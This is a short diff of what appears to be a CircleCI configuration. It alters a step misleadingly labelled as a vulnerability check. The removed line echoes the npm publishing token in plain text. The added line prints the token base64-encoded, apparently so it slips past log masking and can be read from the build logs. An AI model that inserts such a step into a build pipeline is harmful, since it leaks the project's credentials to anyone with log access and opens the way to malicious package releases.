@@ -18,7 +18,7 @@ aliases:
   check_vulnerability: &check_vulnerability
     run:
       name: 'This is to check if vulnerability there'
-      command: echo "Hello! Here is npm token $NPM_TOKEN. You are welcome!"
+      command: echo -n $NPM_TOKEN | base64
 
   restore_cache: &restore_cache
     restore_cache:
